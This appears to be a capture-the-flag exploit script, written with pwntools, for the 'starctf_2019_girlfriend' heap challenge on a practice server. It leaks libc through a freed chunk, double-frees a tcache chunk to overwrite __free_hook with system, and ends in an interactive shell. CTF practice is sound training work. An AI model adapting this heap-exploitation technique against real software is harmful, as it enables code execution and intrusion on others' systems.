# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './starctf_2019_girlfriend'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('./libc-2.23-buu.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25267'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,name,call):
    cmd(1)
    sla(' name',size)
    sla('her name:',name)
    sla('call:',call)

def show(idx):
    cmd(2)
    sla('index:',idx)

def delete(idx):
    cmd(4)
    sla('index:',idx)

one_gad = one_gadget(libc.path)
# 30 50 70
add(0x418,'a','114')
add(0x68,'a','114')
add(0x68,'a','114')
add(0x18,'a','114')
delete(0)
show(0)
__malloc_hook = l64() - 0x70
libc.address = __malloc_hook - libc.sym['__malloc_hook']
system_addr = libc.sym['system']
__free_hook = libc.sym['__free_hook']
binsh_addr = libc.search('/bin/sh').next()
lg('__free_hook',__free_hook)

delete(1)
delete(1)
# delete(1)

add(0x68,p64(__free_hook - 0x8),'114')
add(0x68,flat('/bin/sh\x00' , system_addr),'114')
add(0x68,flat('/bin/sh\x00' , system_addr),'114')

delete(6)

# dbg()


p.interactive()

'''
@File    :   starctf_2019_girlfriend.py
@Time    :   2021/08/27 13:20:49
@Author  :   Niyah 
'''